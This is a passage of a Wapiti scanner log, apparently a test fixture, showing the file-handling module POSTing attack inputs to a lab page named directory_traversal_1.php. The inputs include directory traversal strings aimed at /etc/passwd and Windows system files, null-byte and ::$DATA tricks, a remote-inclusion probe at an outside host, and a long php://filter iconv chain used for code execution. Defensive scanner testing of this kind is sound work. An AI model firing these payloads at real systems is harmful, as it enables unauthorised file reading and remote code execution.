+2024-03-20 16:55:09.827 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=105
+2024-03-20 16:55:09.829 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&bug=105
+2024-03-20 16:55:09.835 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&bug=105
+2024-03-20 16:55:09.842 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:09.848 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2Fetc%2Fpasswd%00&bug=105
+2024-03-20 16:55:09.854 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:09.861 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:09.866 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&bug=105
+2024-03-20 16:55:09.873 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&bug=105
+2024-03-20 16:55:09.879 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&bug=105
+2024-03-20 16:55:09.885 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:09.891 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:09.897 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&bug=105
+2024-03-20 16:55:09.903 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&bug=105
+2024-03-20 16:55:09.910 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&bug=105
+2024-03-20 16:55:09.916 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:09.923 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:09.929 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=105
+2024-03-20 16:55:09.934 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=105
+2024-03-20 16:55:09.941 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:09.947 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:09.953 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:09.960 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:09.971 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:09.982 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:09.993 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.003 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.014 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&bug=105
+2024-03-20 16:55:10.027 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:10.040 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:10.047 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=105
+2024-03-20 16:55:10.054 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=105
+2024-03-20 16:55:10.062 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.077 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.083 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.091 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.098 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.106 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.113 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.119 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:10.127 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:10.134 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=105
+2024-03-20 16:55:10.141 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=105
+2024-03-20 16:55:10.147 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.152 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.161 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.168 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.177 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.183 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.190 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.199 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.206 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=file%3A%2F%2F%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:10.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&bug=105
+2024-03-20 16:55:10.220 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&bug=105
+2024-03-20 16:55:10.227 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&bug=105
+2024-03-20 16:55:10.234 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.240 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.246 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=105
+2024-03-20 16:55:10.255 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=105
+2024-03-20 16:55:10.263 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=directory_traversal_1.php&bug=105
+2024-03-20 16:55:10.269 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=directory_traversal_1.php%00&bug=105
+2024-03-20 16:55:10.277 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=directory_traversal_1.php%3A%3A%24DATA&bug=105
+2024-03-20 16:55:10.288 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:55:10.298 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:55:10.307 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%2Fetc%2Fpasswd
+2024-03-20 16:55:10.314 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%2Fetc%2Fpasswd%00
+2024-03-20 16:55:10.320 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%2Fetc%2Fservices
+2024-03-20 16:55:10.327 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=%2Fetc%2Fservices%00
+2024-03-20 16:55:10.334 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:55:10.346 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:55:10.357 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:55:10.368 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:10.380 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:10.393 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:55:10.406 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:55:10.415 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:55:10.425 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:10.434 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:10.444 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:10.451 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/directory_traversal_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
